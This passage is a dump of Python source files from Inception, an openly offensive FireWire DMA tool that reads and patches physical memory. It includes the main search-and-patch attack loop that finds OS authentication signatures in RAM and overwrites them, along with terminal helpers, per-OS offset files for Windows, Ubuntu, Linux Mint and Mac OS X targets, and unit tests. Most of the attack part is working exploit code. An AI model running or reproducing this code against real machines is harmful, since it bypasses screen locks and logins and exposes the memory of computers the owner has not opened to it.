        if c['chunk'] != candidate[ioffset:ioffset + len(c['chunk'])]:
            return False
    return True
    

def patch(device, address, chunks):
    '''
    Writes back to the device at address, using the patches in the signature
    chunks
    '''
    success = True
    backup = device.read(address, cfg.PAGESIZE)

    for c in chunks:
        if len(cfg.patchfile) > 0:
            patch = cfg.patchfile
        else:
            patch = c['patch']
        if not patch:
            continue

        ioffset = c['internaloffset']
        poffset = c['patchoffset']
        if not poffset: 
            poffset = 0
        realaddress = address + ioffset + poffset

        device.write(realaddress, patch)
        read = device.read(realaddress, len(patch))
        if cfg.verbose:
            term.info('Data read back: ' + util.bytes2hexstr(read)) #TODO: Change to .format()
        if read != patch:
            success = False

        # Only patch once from file
        if len(cfg.patchfile) > 0:
            break

    return success, backup
        

def searchanddestroy(device, target, memsize):
    '''
    Main search loop
    '''
    pageaddress = cfg.startaddress
    signatures = target['signatures']

    # Add signature lengths in bytes to the dictionary, and replace integer
    # representations of the signatures and patches with bytes
    for signature in signatures:
        signature['length'] = siglen(signature['chunks'])
        offsets = signature['offsets'] # Offsets within pages
        for chunk in signature['chunks']:
            chunk['chunk'] = util.int2binhex(chunk['chunk'])
            try:
                chunk['patch'] = util.int2binhex(chunk['patch'])
            except KeyError:
                chunk['patch'] = None
    
    # Progress bar
    prog = term.ProgressBar(max_value = memsize, total_width = cfg.wrapper.width, 
                            print_data = cfg.verbose)

    try:
        # Build a batch of read requests of the form: [(addr1, len1), ...] and
        # a corresponding match vector: [(chunks1, patchoffset1), ...]
        j = 0
        count = 0
        cand = b'\x00'
        r = []
        p = []
        while pageaddress < memsize:
            sig_len = len(signatures)
            
            for i in range(sig_len): # Iterate over signatures
                offsets = signatures[i]['offsets'] # Offsets within pages
                if isinstance(offsets, int):
                    offsets = [offsets] # Create a list if single offset
                chunks = signatures[i]['chunks'] # The chunks that is the sig
                length = signatures[i]['length'] # Sig length in bytes
                offset_len = len(offsets)
                
                for n in range(offset_len): # Iterate over offsets
                    address = pageaddress + offsets[n] + cfg.PAGESIZE * j
                    r.append((address, length))
                    p.append(chunks)
                    count += 1
                    # If we have built a full vector, read from memory and
                    # compare to the corresponding signatures
                    if count == cfg.vectorsize:
                        # Read data from device
                        m = 0
                        for caddr, cand  in device.readv(r):
                            if match(cand, p[m]):
                                print()
                                return (caddr, p[m])
                            m += 1                    
                        # Jump to next pages (we're finished with these)
                        mask = ~(cfg.PAGESIZE - 0x01)
                        pageaddress = address & mask
                        if sig_len == i and offset_len == n:
                            pageaddress = pageaddress + cfg.PAGESIZE
                            
                        # Zero out counters and vectors
                        j = 0
                        count = 0
                        r = []
                        p = []
                        
                        # Print status
                        prog.update_amount(pageaddress, cand)
                        prog.draw()
                         
            j += 1 # Increase read request count
            
    except IOError:
        print()
        term.fail('I/O Error, make sure FireWire interfaces are properly ' +
                  'connected')
    except KeyboardInterrupt:
        print()
        term.fail('Aborted')
        raise KeyboardInterrupt
    
    # If we get here, we haven't found anything :-/
    print()    
    return (None, None)


def attack(targets):
    '''
    Main attack logic
    '''
    # Initialize and lower DMA shield
    if not cfg.filemode:
        try:
            fw = firewire.FireWire()
        except IOError:
            term.fail('Could not initialize FireWire. Are the modules ' +
                      'loaded into the kernel?')
        start = time.time()
        device_index = fw.select_device()

    # List targets
    list_targets(targets)
       
    # Select target
    target = select_target(targets)
    
    # Print selection. If verbose, print selection with signatures
    term.info('Selected target: ' + target['OS'] + ': ' + target['name'])
    if cfg.verbose:
        printdetails(target)
    
    # Lower DMA shield or use a file as input, and set memsize
    device = None
    memsize = None
    if cfg.filemode:
        device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
        memsize = os.path.getsize(cfg.filename)
    else:
        elapsed = int(time.time() - start)
        device = fw.getdevice(device_index, elapsed)
        memsize = cfg.memsize
    
    # Perform parallel search for all signatures for each OS at the known 
    # offsets
    term.info('DMA shields should be down by now. Attacking...')
    address, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Fall-back sequential search?
        return None, None
    
    # Signature found, let's patch
    mask = 0xfffff000 # Mask away the lower bits to find the page number
    page = int((address & mask) / cfg.PAGESIZE)
    term.info('Signature found at {0:#x} in page no. {1}'.format(address, page))
    if not cfg.dry_run:
        success, backup = patch(device, address, chunks)
        if success:
            if cfg.egg:
                sound.play('resources/inception.wav')
            term.info('Patch verified; successful')
            term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
        else:
            term.warn('Write-back could not be verified; patching *may* ' +
                      'have been unsuccessful')

        if cfg.revert:
            term.poll('Press [enter] to revert the patch:')
            input()
            device.write(address, backup)

            if backup == device.read(address, cfg.PAGESIZE):
                term.info('Revert patch verified; successful')
            else:
                term.warn('Revert patch could not be verified')

    #Clean up
    device.close()
    
    return address, page

########NEW FILE########
__FILENAME__ = sound
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Oct 11, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import cfg
import os.path
import subprocess

    
def play(filename):
    '''
    Crude interface for playing wav sounds - dies silently if something fails
    '''
    f = os.path.join(os.path.dirname(__file__),filename)

    try:
        if (filename.endswith('.wav') or filename.endswith('.mp3')) and os.path.exists(f):
            if cfg.os == cfg.LINUX:
                cmd = 'aplay'
            elif cfg.os == cfg.OSX:
                cmd = 'afplay'
            else:
                raise Exception
            with open(os.devnull, "w") as fnull:
                return subprocess.Popen([cmd,f], stdout = fnull, stderr = fnull)
    except:
        pass
########NEW FILE########
__FILENAME__ = term
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Sep 6, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import cfg
import binascii
import os
import sys
import subprocess
import time
from textwrap import TextWrapper

def size():
    '''
    Returns the size (width) of the terminal
    '''
    try:
        with open(os.devnull, 'w') as fnull:
            r, c = subprocess.check_output(['stty','size'], stderr = fnull).split() #@UnusedVariable
        return int(c)
    except:
        warn('Cannot detect terminal column width')
        return 80
    

def write(s, indent = True, end_newline = True):
    '''
    Prints a line and wraps each line at terminal width
    '''
    if not indent:
        default_indent = cfg.wrapper.subsequent_indent # Save default indent
        cfg.wrapper.subsequent_indent = ''
    wrapped = '\n'.join(cfg.wrapper.wrap(str(s)))
    if not end_newline:
        print(wrapped, end = ' ')
    else:
        print(wrapped)
    if not indent:
        cfg.wrapper.subsequent_indent = default_indent # Restore default indent


def info(s, sign = '*'):
    '''
    Print an informational message with '*' as a sign
    '''
    write('[{0}] {1}'.format(sign, s))


def poll(s, sign = '?'):
    '''
    Prints a question to the user
    '''
    write('[{0}] {1}'.format(sign, s), end_newline = False)
    
    
def warn(s, sign = '!'):
    '''
    Prints a warning message with '!' as a sign
    '''
    write('[{0}] {1}'.format(sign, s))
    
    
def fail(err = None):
    '''
    Called if Inception fails. Optional parameter is an error message string.
    '''
    if err: warn(err)
    warn('Attack unsuccessful')
    sys.exit(1)


def separator():
    '''
    Prints a separator line with the width of the terminal
    '''
    print('-' * size())
    

class ProgressBar:
    '''
    Builds and displays a text-based progress bar
    
    Based on https://gist.github.com/3306295
    '''

    def __init__(self, min_value=0, max_value=100, total_width=80, 
                 print_data = False):
        '''
        Initializes the progress bar
        '''
        self.progbar = ''   # This holds the progress bar string
        self.old_progbar = ''
        self.min = min_value
        self.max = max_value
        self.span = max_value - min_value
        self.width = total_width - len(' 4096 MiB (100%)')
        self.unit = cfg.MiB
        self.unit_name = 'MiB'
        self.print_data = print_data
        if self.print_data:
            self.data_width = total_width // 5
            if self.data_width % 2 != 0:
                self.data_width = self.data_width + 1
            self.width = self.width - (len(' {}') + self.data_width)
        else:
            self.data_width = 0
        self.amount = 0       # When amount == max, we are 100% done 
        self.update_amount(0)  # Build progress bar string


    def append_amount(self, append):
        '''
        Increases the current amount of the value of append and 
        updates the progress bar to new ammount
        '''
        self.update_amount(self.amount + append)
    
    def update_percentage(self, new_percentage):
        '''
        Updates the progress bar to the new percentage
        '''
        self.update_amount((new_percentage * float(self.max)) / 100.0)
        

    def update_amount(self, new_amount=0, data = b'\x00'):
        '''
        Update the progress bar with the new amount (with min and max
        values set at initialization; if it is over or under, it takes the
        min or max value as a default
        '''
        if new_amount < self.min:
            new_amount = self.min
        if new_amount > self.max:
            new_amount = self.max
        self.amount = new_amount
        rel_amount = new_amount - self.min

        # Figure out the new percent done, round to an integer
        diff_from_min = float(self.amount - self.min)
        percent_done = (diff_from_min / float(self.span)) * 100.0
        percent_done = int(round(percent_done))

        # Figure out how many hash bars the percentage should be
        all_full = self.width - 2
        num_hashes = (percent_done / 100.0) * all_full
        num_hashes = int(round(num_hashes))

        # Build a progress bar with an arrow of equal signs; special cases for
        # empty and full
        if num_hashes == 0:
            self.progbar = '[>{0}]'.format(' ' * (all_full - 1))
        elif num_hashes == all_full:
            self.progbar = '[{0}]'.format('=' * all_full)
        else:
            self.progbar = '[{0}>{1}]'.format('=' * (num_hashes - 1),
                                              ' ' * (all_full - num_hashes))

        # Generate string
        percent_str = '{0:>4d} {1} ({2:>3}%)'.format(rel_amount // self.unit,
                                                     self.unit_name,
                                                     percent_done)
        
        # If we are to print data, append it
        if self.print_data:
            data_hex = bytes.decode(binascii.hexlify(data))
            data_str = ' {{{0:0>{1}.{1}}}}'.format(data_hex, self.data_width)
            percent_str = percent_str + data_str    

        # Slice the percentage into the bar
        self.progbar = ' '.join([self.progbar, percent_str])
    
    def draw(self):
        '''
        Draws the progress bar if it has changed from it's previous value
        '''
        if self.progbar != self.old_progbar:
            self.old_progbar = self.progbar
            sys.stdout.write(self.progbar + '\r')
            sys.stdout.flush() # force updating of screen

    def __str__(self):
        '''
        Returns the current progress bar
        '''
        return str(self.progbar)
    

class BeachBall:
    '''
    An ASCII beach ball
    '''
    
    def __init__(self, max_frequency = 0.1):
        self.states = ['-', '\\', '|', '/']
        self.state = 0
        self.max_frequency = max_frequency
        self.time_drawn = time.time()
        
    def draw(self, force = False):
        '''
        Draws the beach ball if the time delta since last draw is greater than
        the max_frequency
        '''
        now = time.time()
        if self.max_frequency < now - self.time_drawn or force:
            self.state = (self.state + 1) % len(self.states)
            print('[{0}]\r'.format(self.states[self.state]), end = '')
            sys.stdout.flush()
            self.time_drawn = now

########NEW FILE########
__FILENAME__ = linux-mint-11-x86-0xbaf
page = 5
offset = 0xbaf
OS = 'Linux Mint'
########NEW FILE########
__FILENAME__ = linux-mint-12-x86-0xbaf
page = 1
offset = 0xbaf
OS = 'Linux Mint'
########NEW FILE########
__FILENAME__ = linux-mint-13-x64-0x3c8
page = 4
offset = 0x3c8
OS = 'Linux Mint'
########NEW FILE########
__FILENAME__ = linux-mint-13-x86-0xa7f
page = 0
offset = 0xa7f
OS = 'Linux Mint'
########NEW FILE########
__FILENAME__ = mac-os-x-10.6.8-x86-0x82f
page = 2
offset = 0x82f
OS = 'Mac OS X'

########NEW FILE########
__FILENAME__ = mac-os-x-10.8.2-x64-0x334
page = 4
offset = 0x334
OS = 'Mac OS X'

########NEW FILE########
__FILENAME__ = mac-os-x-10.9-x64-0x1e5
page = 0
offset = 0x1e5
OS = 'Mac OS X'

########NEW FILE########
__FILENAME__ = ubuntu-11.04-x86-0xbaf
page = 5
offset = 0xbaf
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = ubuntu-11.10-x86-0xbaf
page = 1
offset = 0xbaf
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = ubuntu-12.04-x64-0x3c8
page = 4
offset = 0x3c8
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = ubuntu-12.04-x86-0xa7f
page = 0
offset = 0xa7f
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = ubuntu-12.10-x86-0xb46
page = 0
offset = 0xb46
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = ubuntu-13.04-x64-0x69b
page = 0
offset = 0x69b
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = ubuntu-13.04-x86-0xcae
page = 0
offset = 0xcae
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = ubuntu-13.10-x64-0x688
page = 0
offset = 0x688
OS = 'Ubuntu'
########NEW FILE########
__FILENAME__ = windows-7-enterprise-x64-sp0-0x2a1
page = 3
offset = 0x2a1
OS = 'Windows 7'
########NEW FILE########
__FILENAME__ = windows-7-enterprise-x64-sp1-0x291
page = 3
offset = 0x291
OS = 'Windows 7'
########NEW FILE########
__FILENAME__ = windows-7-enterprise-x86-sp0-0x926
page = 4
offset = 0x926
OS = 'Windows 7'
########NEW FILE########
__FILENAME__ = windows-7-enterprise-x86-sp1-0x312
page = 0
offset = 0x312
OS = 'Windows 7'
########NEW FILE########
__FILENAME__ = windows-8-enterprise-x64-sp0-0x208
page = 0
offset = 0x208
OS = 'Windows 8'
########NEW FILE########
__FILENAME__ = windows-8-enterprise-x64-sp0-0xd78
page = 0
offset = 0xd78
OS = 'Windows 8'
########NEW FILE########
__FILENAME__ = windows-8-enterprise-x86-sp0-0xde7
page = 0
offset = 0xde7
OS = 'Windows 8'
########NEW FILE########
__FILENAME__ = windows-8-enterprise-x86-sp1-0xca0
page = 0
offset = 0xca0
OS = 'Windows 8'
########NEW FILE########
__FILENAME__ = windows-vista-enterprise-x64-sp2-0x1a1
page = 0
offset = 0x1a1
OS = 'Windows Vista'
########NEW FILE########
__FILENAME__ = windows-vista-enterprise-x86-sp2-0x74a
page = 0
offset = 0x74a
OS = 'Windows Vista'
########NEW FILE########
__FILENAME__ = windows-xp-sp2-0x9b6
page = 0
offset = 0x9b6
OS = 'Windows XP'
########NEW FILE########
__FILENAME__ = windows-xp-sp3-0x862
page = 0
offset = 0x862
OS = 'Windows XP'
########NEW FILE########
__FILENAME__ = windows-xp-sp3-0x8aa
page = 0
offset = 0x8aa
OS = 'Windows XP'
########NEW FILE########
__FILENAME__ = test_firewire
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 30, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception.firewire import FireWire
import unittest


class TestUtil(unittest.TestCase):


    def setUp(self):
        self.fw = FireWire()


    def tearDown(self):
        pass


    def test_init_OUI(self):
        self.assertIsInstance(self.fw.oui, dict)
        # Test a couple of OUIs
        self.assertEqual(self.fw.resolve_oui(0x03), 'XEROX CORPORATION')
        self.assertEqual(self.fw.resolve_oui(0xE0C1), 
                         'MEMOREX TELEX JAPAN, LTD.')
        self.assertEqual(self.fw.resolve_oui(0xFCFBFB), 'Cisco Systems')
    


if __name__ == "__main__":
    unittest.main()

########NEW FILE########
__FILENAME__ = test_memdump
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Nov 4, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from _pyio import StringIO
from inception import cfg, memdump
import hashlib
import os
import random
import shutil
import sys
import unittest


class MemdumpTest(unittest.TestCase):


    def setUp(self):
        self.samples = []
        self.tests = None
        cfg.memdump = True
        cfg.filemode = True
        if not os.path.exists('temp'):
            os.makedirs('temp')
        cfg.memdump_prefix = 'temp/unittest'
        for root, dirs, files in os.walk(os.path.join(os.path.dirname(__file__), 'samples/')): #@UnusedVariable
            for name in files:
                filepath = os.path.join(root, name)
                mod_name, file_ext = os.path.splitext(os.path.split(filepath)[-1]) #@UnusedVariable
                if file_ext == '.bin':
                    self.samples.append(filepath)
                    

    def tearDown(self):
        shutil.rmtree('temp')


    def test_fulldump(self):
        start = 0x00000000
        for sample in self.samples:
            cfg.filename = sample
            end = os.path.getsize(sample)
            sys.stdout = StringIO() # Suppress output
            memdump.dump(start, end)
            sys.stdout = sys.__stdout__ # Restore output
            output_fn = memdump.filename
            self.assertTrue(os.path.exists(output_fn))
            self.assertEqual(self.file_md5(sample), self.file_md5(output_fn))
    
    
    def test_random_read(self):
        '''
        Test a reading from a random sample, with a random size and a random
        start address
        '''
        sample = random.sample(self.samples, 1)[0]
        cfg.filename = sample
        self.assertTrue(os.path.exists(sample))
        sample_size = os.path.getsize(sample)
        start = random.randrange(sample_size)
        size_range = sample_size - start
        dump_size = random.randrange(size_range)
        end = start + dump_size
        sys.stdout = StringIO() # Suppress output
        memdump.dump(start, end)
        sys.stdout = sys.__stdout__ # Restore output
        output_fn = memdump.filename
        self.assertTrue(os.path.exists(output_fn))
        md5 = hashlib.md5()
        f = open(sample, 'rb')
        f.seek(start)
        read = f.read(dump_size)
        md5.update(read)
        self.assertEqual(md5.digest(), self.file_md5(output_fn))
        f.close()
    
    
    def file_md5(self, filename):
        md5 = hashlib.md5()
        with open(filename,'rb') as f: 
            for chunk in iter(lambda: f.read(128 * md5.block_size), b''):
                md5.update(chunk)
        return md5.digest()
    

if __name__ == "__main__":
    #import sys;sys.argv = ['', 'Test.testName']
    unittest.main()
########NEW FILE########
__FILENAME__ = test_screenlock
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 30, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from _pyio import StringIO
from inception import screenlock, cfg
from os import path
import imp
import inception.cfg
import os
import sys
import unittest
import importlib


class TestScreenlock(unittest.TestCase):


    def setUp(self):
        self.samples = []
        self.tests = None
        for root, dirs, files in os.walk(path.join(os.path.dirname(__file__), 'samples/')): #@UnusedVariable
            for name in files:
                filepath = os.path.join(root, name)
                mod_name, file_ext = os.path.splitext(os.path.split(filepath)[-1])
                if file_ext == '.py':
                    self.samples.append((mod_name, filepath))


    def tearDown(self):
        pass


    def test_screenlock(self):
        for sample in self.samples:
            cfg = imp.reload(inception.cfg)
            cfg.startaddress = 0x00000000
            mod_name = sample[0]
            #print(mod_name)
            filepath = sample[1]
            try:
                module = importlib.machinery.SourceFileLoader(mod_name, filepath).load_module()
            except ImportError:
                assert(module)
            cfg.filemode = True
            cfg.filename = path.join(path.dirname(__file__), 'samples/') + mod_name + '.bin'
            foundtarget = False
            for target in cfg.targets:
                if target['OS'] == module.OS:
                    foundtarget = [target]
            self.assertTrue(foundtarget)
            sys.stdout = StringIO() # Suppress output
            address, page = screenlock.attack(foundtarget)
            sys.stdout = sys.__stdout__ # Restore output
            #print(address & 0x00000fff)
            #print(module.offset)
            self.assertEqual(address & 0x00000fff, module.offset)
            self.assertEqual(page, module.page)


if __name__ == "__main__":
    unittest.main()

########NEW FILE########
__FILENAME__ = test_term
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 13, 2013

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from _pyio import StringIO
from inception import cfg
from inception import term
import sys
import unittest


class Test(unittest.TestCase):


    def setUp(self):
        pass


    def tearDown(self):
        pass
    
        
    def test_write(self):
        s = 'A' * (3 * term.size())
        cfg.wrapper.width = term.size()
        sys.stdout = StringIO() # Suppress output
        sys.stdout.write('')
        term.write(s)
        out = sys.stdout.getvalue()
        sys.stdout = sys.__stdout__ # Restore output
        expected = 'A' * term.size()
        n = term.size()
        expected = 'A' * term.size() + '\n    '
        t = 'A' * (2 * term.size())
        expected = expected + '\n    '.join([t[i:i+n-4] for i in range(0, len(t) -4 , n-4)]) + '\n'
        self.assertEqual(out, expected)


if __name__ == "__main__":
    unittest.main()
########NEW FILE########
__FILENAME__ = test_util
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 30, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception.util import hexstr2bytes, bytes2hexstr, bytelen, int2binhex, parse_unit
import unittest


class TestUtil(unittest.TestCase):


    def setUp(self):
        pass


    def tearDown(self):
        pass


    def test_hexstr2bytes(self):
        test1 = '0x41424344'
        test1_res = b'ABCD'
        self.assertEqual(hexstr2bytes(test1), test1_res)
        test2 = '41424344'
        self.assertRaises(BytesWarning, hexstr2bytes, test2)
        
    def test_bytes2hexstr(self):
        test1 = b'ABCD'
        test1_res = '0x41424344'
        self.assertEqual(bytes2hexstr(test1), test1_res)
        test2 = '41424344'
        self.assertRaises(BytesWarning, bytes2hexstr, test2)

    def test_bytelen(self):
        test1 = -16
        test1_res = 2
        self.assertEqual(bytelen(test1), test1_res)
        test2 = 1
        test2_res = 1
        self.assertEqual(bytelen(test2), test2_res)
        test3 = 15
        test3_res = 1
        self.assertEqual(bytelen(test3), test3_res)
        
    def test_int2binhex(self):
        test1 = -16
        self.assertRaises(TypeError, int2binhex, test1)
        test2 = 1
        test2_res = b'\x01'
        self.assertEqual(int2binhex(test2), test2_res)
        test3 = 15
        test3_res = b'\x0f'
        self.assertEqual(int2binhex(test3), test3_res)
        test4 = 256
        test4_res = b'\x01\x00'
        self.assertEqual(int2binhex(test4), test4_res)

    def test_parse_unit(self):
        test1 = '1KB'
        self.assertEqual(parse_unit(test1), 1024)
        test2 = '45MiB'
        self.assertEqual(parse_unit(test2), 47185920)
        test3 = '1337gb'
        self.assertEqual(parse_unit(test3), 1435592818688)
        test4 = '12g12gb'
        with self.assertRaises(ValueError):
            parse_unit(test4)



if __name__ == "__main__":
    unittest.main()

########NEW FILE########
__FILENAME__ = util
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jun 19, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import cfg, term
from subprocess import call
import binascii
import os
import platform
import sys


def hexstr2bytes(s):
    '''
    Takes a string of hexadecimal characters preceded by '0x' and returns the
    corresponding byte string. That is, '0x41' becomes b'A'
    '''
    if isinstance(s, str) and s.startswith('0x'):
        s = s.replace('0x', '') # Remove '0x' strings from hex string
        if len(s) % 2 == 1: s = '0' + s # Pad with zero if odd-length string
        return binascii.unhexlify(bytes(s, sys.getdefaultencoding()))
    else:
        raise BytesWarning('Not a string starting with \'0x\': {0}'.format(s))
    

def bytes2hexstr(b):
    '''
    Takes a string of bytes and returns a string with the corresponding
    hexadecimal representation. Example: b'A' becomes '0x41'
    '''
    if isinstance(b, bytes):
        return '0x' + bytes.decode(binascii.hexlify(b))
    else:
        raise BytesWarning('Not a byte string')
        

def bytelen(s):
    '''
    Returns the byte length of an integer
    '''
    return (len(hex(s))) // 2


def int2binhex(i):
    '''
    Converts positive integer to its binary hexadecimal representation
    '''
    if i < 0:
        raise TypeError('Not a positive integer: {0}'.format(i))
    return hexstr2bytes(hex(i))


def open_file(filename, mode):
    '''
    Opens a file that are a part of the package. The file must be in the folder
    tree beneath the main package
    '''
    this_dir, this_filename = os.path.split(__file__) #@UnusedVariable
    path = os.path.join(this_dir, filename)
    return open(path, mode)
    

def parse_unit(size):
    '''
    Parses input in the form of a number and a (optional) unit and returns the
    size in either multiplies of the page size (if no unit is given) or the
    size in KiB, MiB or GiB
    '''
    size = size.lower()
    if size.find('kib') != -1 or size.find('kb') != -1:
        size = int(size.rstrip(' kib')) * cfg.KiB
    elif size.find('mib') != -1 or size.find('mb') != -1:
        size = int(size.rstrip(' mib')) * cfg.MiB
    elif size.find('gib') != -1 or size.find('gb') != -1:
        size = int(size.rstrip(' gib')) * cfg.GiB
    else:
        size = int(size) * cfg.PAGESIZE
    return size


def detectos():
    '''
    Detects host operating system
    '''
    return platform.system()


def unload_fw_ip():
    '''
    Unloads IP over FireWire modules if present on OS X
    '''
    term.poll('IOFireWireIP on OS X may cause kernel panics. Unload? [Y/n]: ')
    unload = input().lower()
    if unload in ['y', '']:
        status = call('kextunload /System/Library/Extensions/IOFireWireIP.kext',
                      shell=True)
        if status == 0:
            term.info('IOFireWireIP.kext unloaded')
            term.info('To reload: sudo kextload /System/Library/Extensions/' +
                 'IOFireWireIP.kext')
        else:
            term.fail('Could not unload IOFireWireIP.kext')

def cleanup():
    '''
    Cleans up at exit
    '''
    for egg in cfg.eggs:
        egg.terminate()


def restart():
    '''
    Restarts the current program. Note: this function does not return. 
    '''
    python = sys.executable
    os.execl(python, python, * sys.argv)


class MemoryFile:
    '''
    File that exposes a similar interface as the FireWire class. Used for
    reading from RAM memory files of memory dumps
    '''

    def __init__(self, file_name, pagesize):
        '''
        Constructor
        '''
        self.file = open(file_name, mode='r+b')
        self.pagesize = pagesize
    
    def read(self, addr, numb, buf=None):
        self.file.seek(addr)
        return self.file.read(numb)  
    
    def readv(self, req):
        for r in req:
            self.file.seek(r[0])
            yield (r[0], self.file.read(r[1]))
    
    def write(self, addr, buf):
        if cfg.forcewrite:
            term.poll('Are you sure you want to write to file [y/N]? ')
            answer = input().lower()
            if answer in ['y', 'yes']:
                self.file.seek(addr)
                self.file.write(buf)
        else:
            term.warn('File not patched. To enable file writing, use the ' +
                      '--force-write switch')
    
    def close(self):
        self.file.close()
    
    


########NEW FILE########
